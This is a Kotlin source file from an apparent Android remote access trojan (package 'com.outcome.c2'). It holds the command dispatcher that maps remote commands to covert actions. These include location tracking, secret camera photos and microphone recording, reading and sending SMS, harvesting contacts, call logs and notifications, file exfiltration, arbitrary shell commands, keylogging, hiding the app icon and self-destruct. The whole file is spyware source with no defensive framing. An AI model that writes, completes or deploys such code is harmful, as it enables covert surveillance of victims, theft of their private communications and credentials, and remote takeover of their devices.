package com.outcome.c2

import android.content.Context
import org.json.JSONObject

object CommandExecutor {

    fun run(ctx: Context, type: String, args: JSONObject): JSONObject = when (type) {
        // Recon
        "device_info"        -> DeviceInfo.snapshot(ctx, DeviceInfo.id(ctx))
        "list_apps"          -> Apps.list(ctx, args.optBoolean("system_only", false))
        "location"           -> Location.get(ctx)
        "network_info"       -> NetworkInfo.snapshot(ctx)
        "list_permissions"   -> JSONObject().put("error", "not_implemented")
        "running_processes"  -> JSONObject().put("error", "not_implemented")

        // Camera / media
        "camera_photo"       -> Camera.capture(ctx, args.optString("camera", "back"))
        "mic_record"         -> Audio.record(ctx, args.optInt("duration", 10))
        "camera_stream"      -> JSONObject().put("error", "not_implemented")
        "screen_record"      -> JSONObject().put("error", "handled_by_service")

        // Comms / data
        "sms_list"           -> Sms.list(ctx, args.optInt("limit", 50))
        "sms_send"           -> Sms.send(ctx, args.getString("number"), args.getString("text"))
        "contacts"           -> Contacts.list(ctx)
        "call_log"           -> CallLog.list(ctx, args.optInt("limit", 50))
        "notifications"      -> JSONObject()
            .put("count", NotificationsBuffer.peek().length())
            .put("items", NotificationsBuffer.drain())

        // Files
        "list_dir"           -> Files.listDir(args.getString("path"))
        "download_file"      -> Files.exfil(ctx, args.getString("path"))
        "upload_file"        -> Files.upload(ctx, args.getString("remote_path"), args.getString("data_b64"))
        "delete_file"        -> Files.delete(args.getString("path"))

        // Execution
        "shell"              -> Shell.exec(args.getString("cmd"))

        // System control
        "lock_screen"        -> SystemControl.lockScreen(ctx)
        "go_home"            -> SystemControl.goHome()
        "go_back"            -> SystemControl.back()
        "recents"            -> SystemControl.recents()
        "open_notifications" -> SystemControl.openNotifications()
        "open_app"           -> SystemControl.openApp(ctx, args.getString("package"))
        "open_url"           -> SystemControl.openUrl(ctx, args.getString("url"))
        "set_wakelock"       -> SystemControl.wakeLock(ctx, args.optLong("ms", 10_000))
        "vibrate"            -> { Ui.vibrate(ctx, args.optLong("ms", 500)); JSONObject().put("ok", true) }
        "toast"              -> { Ui.toast(ctx, args.optString("text", "")); JSONObject().put("ok", true) }

        // Keylogger
        "keylog_start"       -> JSONObject().put("ok", KeylogBuffer.start())
        "keylog_stop"        -> JSONObject().put("ok", KeylogBuffer.stop())
        "keylog_dump"        -> KeylogBuffer.dump()

        // Icons
        "hide_icon"          -> IconHider.hide(ctx)
        "show_icon"          -> IconHider.show(ctx)

        // Destruct
        "self_destruct"      -> SelfDestruct.run(ctx)

        else                 -> JSONObject().put("error", "unsupported command: $type")
    }
}
